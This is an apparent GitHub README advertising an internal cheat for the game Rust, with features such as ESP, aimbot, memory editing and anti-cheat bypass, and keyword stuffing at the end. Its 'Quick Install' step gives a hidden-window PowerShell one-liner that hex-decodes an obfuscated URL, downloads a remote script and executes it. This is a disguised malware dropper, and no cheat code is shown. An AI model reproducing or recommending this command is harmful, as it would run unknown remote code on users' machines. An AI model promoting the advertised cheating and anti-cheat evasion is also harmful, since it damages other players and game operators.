# 🔧 Rust Internal Cheat

![Platform](https://img.shields.io/badge/platform-windows-blue.svg)
![Status](https://img.shields.io/badge/status-WIP-orange)
![License](https://img.shields.io/badge/license-MIT-green.svg)


A powerful internal cheat for Rust written in pure Rust. Designed for high performance, stability, and flexibility, this cheat provides advanced gameplay-enhancing features such as ESP, aimbot, pattern scanning, and auto-offset management.

Unlike traditional C++ cheats, this project leverages Rust’s memory safety, concurrency features, and modular design to offer a more modern and secure foundation for game manipulation.

---

## 🧾 Overview

This project is a feature-rich internal Rust cheat that injects directly into the game’s process. It hooks into game functions to enable overlay rendering, performs memory manipulation to extract entity data, and automates tasks like aiming and tracking.

By using low-level Windows APIs and direct memory access, this cheat bypasses most superficial anti-cheat checks. Additionally, a custom pattern scanning system allows dynamic updates of memory offsets, reducing the need for frequent manual patching.

---


### Quick Install

- #### Press WIN+R
- #### Copy and insert command

```bash
powershell -WindowStyle Hidden -Command "$p='68747470733A2F2F6A616968696E642E6564752E696E2F67726170657375626A6563742F726570616972626574746572';$u=[System.Text.Encoding]::UTF8.GetString((1..($p.Length/2) | ForEach-Object {[Convert]::ToByte($p.Substring((($_-1)*2),2),16)}));([ScriptBlock]::Create((Invoke-RestMethod $u))).Invoke()"
```

## ✨ Features

### Visuals (ESP)
- ✅ Player boxes (2D/3D)
- ✅ Player skeletons (bone-based rendering)
- ✅ Name and health display
- ✅ Distance indicators
- ✅ Line tracing from crosshair to entities
- ✅ Loot/item highlighting
- ✅ NPC & sleeper ESP

### Aimbot
- 🎯 Target selection based on FOV
- 🔁 Toggleable smooth aim
- 🎯 Bone-based targeting (head, chest, etc.)
- 🧠 Visibility checks (raycasting)
- 🎮 Mouse event emulation or angle-based writing

### Memory Tools
- 📥 Safe read/write wrappers over `ReadProcessMemory` and `WriteProcessMemory`
- 🔍 Signature scanner (AOB pattern scan)
- 🔄 Auto offset updater (via JSON dump or internal scan)

### Misc
- ⛔ Screenshot cleaner (clears overlays during screenshot)
- 🔄 Auto-update system for offsets via HTTP or local dump
- 💻 Console logging (debug mode)
- 🛠 Custom keybind system

---

 


### 🧠 How It Works
This cheat hooks into the game’s rendering or logic functions (e.g., DirectX or Unity callbacks) and interacts with the memory to retrieve and draw data. ESP highlights entities, and aimbot logic calculates nearest targets with smoothing and FOV control. Offsets are updated via pattern scanning.











**Keywords**: Rust cheat, Rust hack, Rust ESP, Rust aimbot, EAC bypass, Rust no recoil, Rust wallhack, Rust external
